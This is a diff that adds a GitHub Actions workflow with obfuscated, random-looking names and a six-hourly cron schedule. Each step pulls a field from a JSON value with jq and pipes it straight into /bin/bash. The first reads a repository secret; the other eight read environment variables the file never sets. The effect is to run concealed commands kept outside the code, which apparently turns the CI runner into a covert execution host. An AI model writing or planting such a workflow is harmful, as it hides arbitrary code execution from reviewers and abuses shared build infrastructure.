@@ -1,0 +1,24 @@
+name: songbabu6754
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: songbabu6754
+        env:
+          rzpqk3215: ${{ secrets.rzpqk3215 }}
+        run: |
+          echo $rzpqk3215 | jq -r .y18043 | /bin/bash
+          echo $bzyr4149 | jq -r .vwl86695 | /bin/bash
+          echo $basab640 | jq -r .yzxs38989 | /bin/bash
+          echo $aagp4 | jq -r .kt98307 | /bin/bash
+          echo $ywi9 | jq -r .u3641 | /bin/bash
+          echo $bev38257 | jq -r .d893 | /bin/bash
+          echo $ne5 | jq -r .o364 | /bin/bash
+          echo $uwx8507 | jq -r .lfy15136 | /bin/bash
+          echo $wyo477 | jq -r .yefn369 | /bin/bash
+
